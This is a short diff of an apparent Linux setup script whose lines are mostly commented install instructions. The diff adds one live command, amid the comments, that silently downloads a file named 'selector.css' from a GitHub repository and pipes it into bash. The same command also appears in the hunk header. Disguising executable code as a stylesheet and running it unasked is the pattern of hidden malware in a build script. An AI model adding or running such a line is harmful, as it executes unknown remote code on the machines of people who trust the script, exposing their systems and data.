@@ -44,7 +44,7 @@ curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.c
 #
 #  # Debian based systems
 #  sudo apt update && sudo apt upgrade -y && sudo apt-get dist-upgrade -y
-#
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 # 3. Install Compatibility Libraries and Development Tools or build-essential
 #  # CentOS / Scientific Linux 6
 #  yum groupinstall -y Development\ Tools
